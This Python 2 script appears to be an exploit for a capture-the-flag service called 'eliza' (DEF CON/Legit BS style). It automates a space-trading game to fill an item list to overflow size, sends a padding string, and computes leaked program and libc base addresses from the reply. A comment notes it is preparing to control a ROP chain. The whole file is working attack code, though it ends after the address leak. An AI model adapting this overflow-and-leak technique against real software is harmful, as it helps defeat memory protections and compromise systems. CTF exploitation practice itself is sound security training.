import os, sys
import socket
import binascii
import math
import random
import signal
import base64

AllMessages = ""

def SignalAlarm(signum, frame):
	print "Sig Alarm"
	sys.exit(-1)
	
def GetLines(s):
	global AllMessages
	
	Lines = ""
	while(1):
		NewLine = s.recv(4096)
		
		#if we are hung up on then fail
		if NewLine == "":
			"newline was empty"
			sys.exit(-1)
			
		Lines += NewLine
		if Lines[-10:].strip()[-2:] == ']:':
				break
	#print Lines
	AllMessages += Lines
	return Lines

def SendMessage(s, Msg):
	global AllMessages
	AllMessages += Msg
	s.send(Msg)
	
def GetPlanets(s, LightYears = ""):
	SendMessage(s, "local %s\n" % LightYears)
	CurPlanets = GetLines(s).lower().split("\n")

	#remove the prompt line
	CurPlanets.pop()
	
	#remove the header
	CurPlanets.pop(0)
	CurPlanets.pop(0)
	
	#start parsing the planets up
	PlanetList = {}
	for Entry in CurPlanets:
		Entry = Entry.split("|")
		PlanetList[Entry[0].strip().lower()] = {"name": Entry[0].strip().lower(), "x": int(Entry[1].strip()[:-1]), "y": int(Entry[2].strip()[:-1])}
		AddMessage("Cash Fuel Planet Data: x/y %d/%d" % (int(Entry[1].strip()[:-1]), int(Entry[2].strip()[:-1])))
		
	return PlanetList

def GetMarket(s, Planet):
	global AllMessages
	
	SendMessage(s, "market " + Planet + "\n")
	MarketLines = GetLines(s).lower()

	try:
		Market = MarketLines.split("\n")
		Market.pop(0)
		Market.pop(0)

		#process sell items
		Market.pop(0)
		SellItemList = {}
		while(Market[0] != ""):
			CurItem = Market.pop(0).split("|")
			if CurItem[0].strip() == 'fuel':
				continue
			SellItemList[CurItem[0].strip()] = {"name": CurItem[0].strip(), "quantity": int(CurItem[1].strip()), "weight": int(CurItem[2].strip()), "price": int(CurItem[3].strip())+1}

		#process buy items
		Market.pop(0)
		Market.pop(0)
		Market.pop(0)
	
		BuyItemList = {}
		while(Market[0] != ""):
			CurItem = Market.pop(0).split("|")
			BuyItemList[CurItem[0].strip()] = {"name": CurItem[0].strip(), "excellent": int(CurItem[1]), "regular": int(CurItem[2]), "cheap": int(CurItem[3])}

		Market.pop(0)

		#get planet funds
		Funds = int(Market.pop(0).split(" ")[2])
	except:
		print "market error"
		print MarketLines
		print "all lines"
		print AllMessages
		print "recv"
		print s.recv(4096)
		sys.exit(-1)
		
	return {"sell": SellItemList, "buy": BuyItemList, "funds": Funds}

def GetLY(CurPlanet, NewPlanet):
	AddMessage("Cash Fuel %s xy: %d/%d, %s: xy %d/%d" % (CurPlanet["name"], CurPlanet["x"], CurPlanet["y"], NewPlanet["name"], NewPlanet["x"], NewPlanet["y"]))
	x = CurPlanet["x"] - NewPlanet["x"]
	y = CurPlanet["y"] - NewPlanet["y"]
	LY = int(math.floor(math.sqrt((x*x)+(y*y))))
	return LY

def Jump(s, Planet):
	SendMessage(s, "jump %s\n" % Planet)
	GetLines(s)
	#print "Jumping to %s" % (Planet)
	return Planet

def Buy(s, Item):
	SendMessage(s, "buy %d %s\n" % (Item["quantity"], Item["name"]))
	#print "buying %d of %s" % (Item["quantity"], Item["name"])
	GetLines(s)
	return Item["quantity"]*Item["price"]

def BuyFuel(s, Amount):
	return Buy(s, {"name": "fuel", "quantity": Amount, "price": 1})
	
def Sell(s, Item):
	SendMessage(s, "sell %d %s\n" % (Item["quantity"], Item["name"]))
	#print "selling %d of %s" % (Item["quantity"], Item["name"])
	RetLine = GetLines(s).split("\n")[0]
	SellAmount = int(RetLine.split()[-2])
	return SellAmount

def JumpRandomPlanet(s, PlanetList, CurrentMoney, CurrentPlanet):
	#jump to another location, start out at half of the money we have and keep searching
	JumpList = []
	Range = 2.0
	while(len(JumpList) == 0):
		MoneyLimit = CurrentMoney / Range / 10
		for Planet in PlanetList:
			LYDistance = GetLY(PlanetList[CurrentPlanet], PlanetList[Planet])
			if (LYDistance < int(MoneyLimit)) and (LYDistance > int(MoneyLimit / 2)):
				JumpList.append(Planet)
			Range -= 0.1

			if Range <= 0:
				return ("", 0)
				
	JumpPlanet = random.choice(JumpList)
	LYDistance = GetLY(PlanetList[CurrentPlanet], PlanetList[JumpPlanet])*10

	#print "Jumping to %s, LY %d" % (JumpPlanet, LYDistance)
	Jump(s, JumpPlanet)
	Cost = BuyFuel(s, LYDistance)
	return (JumpPlanet, Cost)

def AddMessage(msg):
	global AllMessages
	AllMessages += msg + "\n"
	
def PurchaseItems(s, Items, PlanetList, CurrentPlanet, LastItem):
	#cycle through the item list getting everything we can at each planet in the list
	#we are assuming fuel is already topped off at 10000

	import pprint
	AddMessage(pprint.pformat(Items))

	print "Beginning large item purchase"
	
	#see if anything exists for the current planet we are on, if so, put it at the beginning
	#of the list
	FoundItem = -1
	for i in xrange(0, len(Items)):
		if (Items[i][0]["planet"] == CurrentPlanet) and (Items[i][0]["name"] != LastItem):
			FoundItem = i
			break
			
	if FoundItem != -1:
		Item = Items.pop(FoundItem)
		Items.insert(0, Item)

	#if it is the only item, put it back
	if len(Items) == 0:
		Items.append(LastItem)
		LastItem = None
		
	#start cycling through items buying everything we need
	TotalLY = 0
	while(len(Items)):
		(CurItem, BuyQuantity) = Items.pop(0)
		if CurrentPlanet != CurItem["planet"]:
			AddMessage("\nCash Fuel - CurrentPlanet: %s" % (CurrentPlanet))
			LY = GetLY(PlanetList[CurrentPlanet], PlanetList[CurItem["planet"]])
			if (TotalLY + LY) >= 1000:
				#buy some gas
				BuyFuel(s, TotalLY * 10)
				TotalLY = 0

			#change planets	
			TotalLY += LY
			AddMessage("\nCash Fuel - Jumping %d LY to %s, Total LY %d" % (LY, CurItem["planet"], TotalLY))
			Jump(s, CurItem["planet"])
			AddMessage("Cash Fuel: Changing CurrentPlanet: %s -> %s" % (CurrentPlanet, CurItem["planet"]))
			CurrentPlanet = CurItem["planet"]

		#GetMarket(s, CurItem["planet"])

		#go through Items finding everything for this planet
		while(CurItem["planet"] == CurrentPlanet):
			CurItem["quantity"] = BuyQuantity
			Buy(s, CurItem)
			#print "Buying %s on %s for %d, qty %d" % (CurItem["name"], CurItem["planet"], CurItem["price"], BuyQuantity)
			
			PopIndex = -1
			for i in xrange(0, len(Items)):
				if (Items[i][0]["planet"] == CurrentPlanet) and (Items[i][0]["name"] != LastItem):
					PopIndex = i
					break
					
			if PopIndex != -1:
				(CurItem, BuyQuantity) = Items.pop(PopIndex)
			else:
				CurItem = {"planet":""}

		#go buy all of the last items now
		if (len(Items) != 0) and (Items[0][0]["name"] == LastItem):
				LastItem = ""

def GetInfo(s, Planet):
	global ElizaID
	
	SendMessage(s, "info %s\n" % Planet)
	Lines = GetLines(s)

	if Planet == 'eliza':
		Lines = Lines.split("\n")
		ElizaID = Lines[1].split(" ")[2]
		ElizaID = binascii.a2b_hex(ElizaID)
		print "!!legitbs-validate-dev-ctf " + base64.b64encode(ElizaID)

def main():
	global JumpFailed, TestedJump, AllMessages, JumpCount
	
	#20 seconds...
	#signal.signal(signal.SIGALRM, SignalAlarm)
	#signal.alarm(20)
	
	#flag if we can sustain buying things
	Unsustainable = 0

	#pick how many items to buy with a 1 in 3 chance of it being too large
	BuySize = 36
	
	#we average 24.7% chance of hitting a bad scenario so retry our connection up to 5 times
	#before just failing them
	while(1):
		JumpFailed = False
		TestedJump = False
	
		s = socket.create_connection((sys.argv[1], 8888))
		GetLines(s)

		CurrentMoney = 1000
		CurrentPlanet = "eliza"
	
		Planets = {}
		KnownMarket = {}
		JumpCount = 0
		
		LastItem = {}
		while(1):
			#go get all planets near us, add anything new that we come across
			NewPlanets = GetPlanets(s)
			for Planet in NewPlanets:
				if Planet not in Planets:
					GetInfo(s, Planet)
					Planets[Planet] = NewPlanets[Planet]
			
			#start finding things to buy, we need 36 to rewrite help, 37 to overwrite info
			#first, find the cheapest, lightest things we can get
			PlanetMarket = {}
	
			for Planet in Planets:
				if GetLY(Planets[CurrentPlanet], Planets[Planet]) < 100:
					PlanetMarket[Planet] = GetMarket(s, Planet)
					KnownMarket[Planet] = PlanetMarket[Planet]
		
			if len(PlanetMarket) == 0:
				Unsustainable += 1
				break
				
				#CurrentMoney -= Cost
				#continue
			
			#find all items we can buy and the cheapest place
			BuyableItems = {}
			TotalItemQty = {}

			for Planet in KnownMarket:
				SellList = KnownMarket[Planet]["sell"]
				for Item in SellList:
					#if not listed then add
					#else check price and get cheaper version
					if Item not in TotalItemQty:
						TotalItemQty[Item] = {"name": Item, "quantity": 0, "price": 0, "weight": SellList[Item]["weight"], "list":[]}

					TotalItemQty[Item]["quantity"] += SellList[Item]["quantity"]
					TotalItemQty[Item]["price"] += SellList[Item]["quantity"]*SellList[Item]["price"]
					TotalItemQty[Item]["list"].append([SellList[Item]["price"], SellList[Item], Planet])

			LowestUsefulItem = {"price": 9999999999999}
			for Entry in TotalItemQty:
					CurEntry = TotalItemQty[Entry]
					if (CurEntry["quantity"] >= 0x1b42) and (LowestUsefulItem["price"] > CurEntry["price"]) and (CurEntry["weight"] <= 4):
						LowestUsefulItem = CurEntry

			CanBuyItems = False

			#restart if we have to 
			if (LowestUsefulItem["price"] == 9999999999999) and (len(Planets) > 700) and (JumpCount > 500):
				print "Found %d planets, not enough qty anywhere" % (len(Planets))
				break
				
			#go find local things
			for Planet in PlanetMarket:
				SellList = PlanetMarket[Planet]["sell"]
				for Item in SellList:
					#if not listed then add
					#else check price and get cheaper version
					if (Item not in BuyableItems) or (SellList[Item]["price"] < BuyableItems[Item]["price"]):
						BuyableItems[Item] = dict(SellList[Item])
						BuyableItems[Item]["planet"] = Planet

			if LowestUsefulItem["price"] != 9999999999999:
				#figure out the minimum needed entries that help
				LowestUsefulItem["list"].sort()

				FinalLowest = []
				TotalQty = 0
				TotalPrice = 0
				for Entry in LowestUsefulItem["list"]:
					#if (TotalQty + Entry[1]["quantity"]) >= 0x510:
					#	Entry[1]["quantity"] = 0x510 - TotalQty
					if (TotalQty + Entry[1]["quantity"]) >= 0x1b42:
						Entry[1]["quantity"] = 0x1b42 - TotalQty
					FinalLowest.append(Entry)

					TotalQty += Entry[1]["quantity"]
					TotalPrice += (Entry[0]*Entry[1]["quantity"])
					if TotalQty >= 0x1b42:
						break
						
				print "Found an item with enough entries: %s, qty %d, price %d, Current money %d" % (LowestUsefulItem["name"], TotalQty, TotalPrice, CurrentMoney)

				if CurrentMoney > TotalPrice:
					#now go see if we have enough money and fuel to buy the number of items we require
					BuyableCost = 0
					BuyableWeight = 0
					BuyItems = []
					for Item in BuyableItems:
						if Item != LowestUsefulItem["name"]:
							BuyItems.append([BuyableItems[Item]["weight"], Item, dict(BuyableItems[Item]), 1])
					BuyItems.sort()

					ItemsToBuy = []
					PlanetsForItems = [CurrentPlanet]
					CanBuyItems = False
					TotalLY = 0
			
					while(len(BuyItems)):
						Item = BuyItems.pop(0)
						#print "Buying %d of %s for %d" % (Item[3], Item[1], Item[0])
					
						if (BuyableWeight + (Item[2]["weight"] * Item[3])) <= 150000:
							BuyableCost += (Item[0]*Item[3])
							BuyableWeight += (Item[2]["weight"]*Item[3])
					
							ItemPlanet = Item[2]["planet"]
							FuelBuy = ""
							if (ItemPlanet not in PlanetsForItems):
								#calculate LY from last planet in the list then add it to the end
								LY = GetLY(Planets[PlanetsForItems[-1]], Planets[ItemPlanet])
								"""
								if LY > 100:
									#make sure we have enough fuel then jump to a planet towards the goal
									BuyableCost += (TotalLY*10)
									TotalLY = 0
									while(LY > 1000):
										#find a planet along the route
										for TestPlanet in Planets:
											TestLY = GetLY(TestPlanet, PlanetsForItems[-1])
											if (TestLY <= 100) and (GetLY(TestPlanet, Planets[ItemPlanet]) < LY):
												#add planet to the list
												PlanetsForItems.append(TestPlanet)
												
												#add fuel to buy
												ItemsToBuy.append(({"name": "fuel", "quantity": TestLY*10, "price": 1}, TestLY*10))
												BuyableCost += (TestLY*10)

												#figure out new distance
												LY = GetLY(Planets[PlanetsForItems[-1]], Planets[ItemPlanet])
												break
								"""
								
								#print "Calculated %d LY from %s to %s" % (LY, PlanetsForItems[-1], ItemPlanet)
								if (TotalLY+LY) >= 1000:
									#traveled too far to get all items, go buy some gas to top off
									BuyableCost += (TotalLY*10)
									#print "Calculated buying gas at %d light years" % (TotalLY)
									FuelBuy = "Buying %d of fuel\n" % (TotalLY*10)
									TotalLY = 0
								else:
									FuelBuy = ""
							
								TotalLY += LY
								PlanetsForItems.append(ItemPlanet)
						
							if BuyableCost > CurrentMoney:
								break

							AddMessage("BuySize: %d, ItemsToBuy: %d" % (BuySize, len(ItemsToBuy)))
							ItemsToBuy.append((Item[2], Item[3]))

							if (Item[1] != LowestUsefulItem["name"]) or (len(BuyItems) == 0):	
								if len(ItemsToBuy) == (BuySize-1):
									#on the last item, insert the ones that let us buy what we need
									#BuyItems.append([BuyableItems[Item]["price"], Item, dict(BuyableItems[Item]), 1])
									BuyItems = []
									for Entry in FinalLowest:
										(EntryPrice, EntryData, Planet) = Entry
										a = [EntryData["price"], EntryData["name"], dict(EntryData), EntryData["quantity"]]
										a[2]["planet"] = Planet
										BuyItems.append(a)
									NormalPlanetsForItems = PlanetsForItems
									PlanetsForItems = [NormalPlanetsForItems[-1]]
								
									#print "Inserting %s at beginning" % (LastItem[1])
								elif len(ItemsToBuy) >= BuySize:
									CanBuyItems = True
									#print "Estimated cash: %d" % (CurrentMoney)
									PurchaseItems(s, ItemsToBuy[:], Planets, CurrentPlanet, LowestUsefulItem["name"])			
									break

			if CanBuyItems:
				break

			#can't buy enough items, go find things to trade
			#now find the stuff we can sell and the highest price
			SellableItems = {}
			for Planet in PlanetMarket:
				BuyList = PlanetMarket[Planet]["buy"]
				for Item in BuyList:
					#if not listed then add
					#else check price and get higher version
					for ItemType in ["cheap", "regular","excellent"]:
						ItemName = (ItemType + " " + Item)
						if (ItemName not in SellableItems) or (SellableItems[ItemName]["price"] < BuyList[Item][ItemType]):
							SellableItems[ItemName] = {"name": ItemName, "planet": Planet, "price": BuyList[Item][ItemType]}
					
			#go find items to sell
			HighestItem = {"profit": 0}
			for SellItem in SellableItems:
				if SellItem in BuyableItems:
					#print "Item %s, buy for %d, sell for %d, weight %d" % (SellItem, BuyableItems[SellItem][0], SellableItems[SellItem][0], BuyableItems[SellItem][1])

					#figure out how much we can buy
					BuyableCount = int(CurrentMoney / BuyableItems[SellItem]["price"])
					if BuyableCount*BuyableItems[SellItem]["weight"] > 150000:
						BuyableCount = int(150000 / BuyableItems[SellItem]["weight"])

					#make sure we don't buy too much from the selling planet
					if BuyableCount > BuyableItems[SellItem]["quantity"]:
						BuyableCount = BuyableItems[SellItem]["quantity"]

					#if buying planet can't afford it, adjust for what they can buy
					if SellableItems[SellItem]["price"]*BuyableCount > PlanetMarket[SellableItems[SellItem]["planet"]]["funds"]:
						BuyableCount = int(PlanetMarket[SellableItems[SellItem]["planet"]]["funds"] / SellableItems[SellItem]["price"])
				
					Profit = (SellableItems[SellItem]["price"]*BuyableCount) - (BuyableItems[SellItem]["price"]*BuyableCount)
					TotalFuel = GetLY(Planets[SellableItems[SellItem]["planet"]], Planets[BuyableItems[SellItem]["planet"]])
					TotalFuel += GetLY(Planets[BuyableItems[SellItem]["planet"]], Planets[CurrentPlanet])
					TotalFuel *= 10
					Profit -= TotalFuel
					if Profit > HighestItem["profit"]:
						HighestItem = {"profit": Profit, "name": SellItem, "sell": dict(SellableItems[SellItem]) , "buy": dict(BuyableItems[SellItem]), "totalfuel": TotalFuel}
						HighestItem["buy"]["quantity"] = BuyableCount
						HighestItem["sell"]["quantity"] = BuyableCount

			LastItem = HighestItem
			if "name" not in HighestItem:
				(CurrentPlanet, Cost) = JumpRandomPlanet(s, Planets, CurrentMoney, CurrentPlanet)

				if CurrentPlanet == "":
					Unsustainable += 1
					break

				CurrentMoney -= Cost
				continue
			
			#print "Item %s, buy %d for %d, sell for %d, weight %d, profit %d, LY %d" % (HighestItem["name"], HighestItem["buy"]["quantity"], HighestItem["buy"]["price"], HighestItem["sell"]["price"], HighestItem["buy"]["weight"], HighestItem["profit"], HighestItem["totalfuel"] / 10.0)

			#go buy it
			if CurrentPlanet != HighestItem["buy"]["planet"]:
				CurrentPlanet = Jump(s, HighestItem["buy"]["planet"])
			CurrentMoney -= Buy(s, HighestItem["buy"])
	
			if CurrentPlanet != HighestItem["sell"]["planet"]:
				CurrentPlanet = Jump(s, HighestItem["sell"]["planet"])
			CurrentMoney += Sell(s, HighestItem["sell"])
	
			CurrentMoney -= BuyFuel(s, HighestItem["totalfuel"])
			JumpCount += (HighestItem["totalfuel"] / 10)
			
			#print "Money: %d (%08x)" % (CurrentMoney, CurrentMoney)

		#we either got here because we can buy the items we need
		#or we are unsustainable and must try again
		if(CanBuyItems):
			break
		else:
			#try again
			s.close()

	if (CanBuyItems == False):
		#our loop failed
		print "We shouldn't be here when we couldn't buy everything"
		sys.exit(-1)
		
	#count how many items we bought
	SendMessage(s, "hold\n")
	HoldData = GetLines(s)
	#print HoldData
	HoldData = HoldData.split("\n")

	print "bought %d items" % BuySize

	#SendLine = LowestUsefulItem["name"] + " %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d \n"
	raw_input()
	SendLine = LowestUsefulItem["name"] + " AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP\n"
	#print len(SendLine)
	s.send(SendLine)
	LineData = GetLines(s)
	#print LineData
	
	LineData = LineData.split(" ")
	"""
	for Entry in LineData:
		if Entry.isdigit():
			print hex(int(Entry))
	"""
	
	ElizaAddr = int(LineData[19]) - 0x5bf
	LibCAddr = int(LineData[18]) - 0x12f59
	print "Eliza Addr: %08x, LibC Addr: %08x" % (ElizaAddr, LibCAddr)

	#now buy a few more items so we can control the rop chain
		
	#print AllMessages
	
	#didn't fail buying stuff and we tried to jump to a bad planet name that was too large
	#all happy
	raw_input()
	sys.exit(0)
	
	#print "large jump", TestedJump, JumpFailed
main()